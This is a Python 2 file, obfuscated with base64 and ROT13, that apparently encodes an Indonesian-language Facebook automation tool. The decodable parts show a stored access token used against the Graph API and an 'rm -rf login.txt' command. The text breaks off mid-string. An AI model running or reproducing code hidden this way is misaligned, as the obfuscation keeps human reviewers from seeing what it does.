# Python code obfuscated by www.development-tools.net 
 

import base64, codecs
magic = ''
love = ''
god = ''
destiny = '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